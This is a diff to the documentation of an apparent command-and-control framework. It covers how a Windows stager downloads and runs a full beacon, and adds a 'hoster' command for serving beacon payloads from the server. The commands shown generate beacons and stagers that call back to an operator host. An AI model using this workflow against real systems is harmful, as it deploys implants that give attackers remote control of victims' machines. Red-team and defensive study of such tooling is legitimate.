@@ -55,19 +55,30 @@ generate stager windows https 192.168.1.10:443 -r 32 -t https -a 127.0.0.1:8080
 5. Writes to temp file and executes via `os.StartProcess`
 6. Stager exits, beacon continues running
 
-**Server setup:** The stager downloads the full beacon from `/agent/download/{beacon_id}` on the server. The server reads the beacon from its local `beacons/` directory — this file must exist before running a stager.
+**Server setup:** The stager downloads the full beacon from `/agent/download/{beacon_id}` on the server. The server checks the hosted files DB first, then falls back to the local `beacons/` directory.
 
 ```bash
-# 1. Generate the beacon from the client
+# Option A: Host via the client (recommended)
+# 1. Generate the beacon
 generate beacon windows http 192.168.1.10:8080
 
-# 2. Copy the compiled beacon to the server's beacons/ directory
+# 2. Host it on the server from the client menu
+hoster host ./main_http_64.exe main_http_64.exe
+
+# 3. Verify it's hosted
+hoster view
+
+# Option B: Copy to filesystem manually
+# 1. Generate the beacon
+generate beacon windows http 192.168.1.10:8080
+
+# 2. Copy to the server's beacons/ directory
 mkdir -p beacons
 cp main_http_64.exe beacons/main_http_64.exe
 # For 32-bit: cp main_http_32.exe beacons/main_http_32.exe
 ```
 
-If the beacon file is missing, the stager will get a `404 Not Found` when trying to download.
+If the beacon file is missing from both the hosted files and `beacons/`, the stager will get a `404 Not Found`.
 
 ---
 
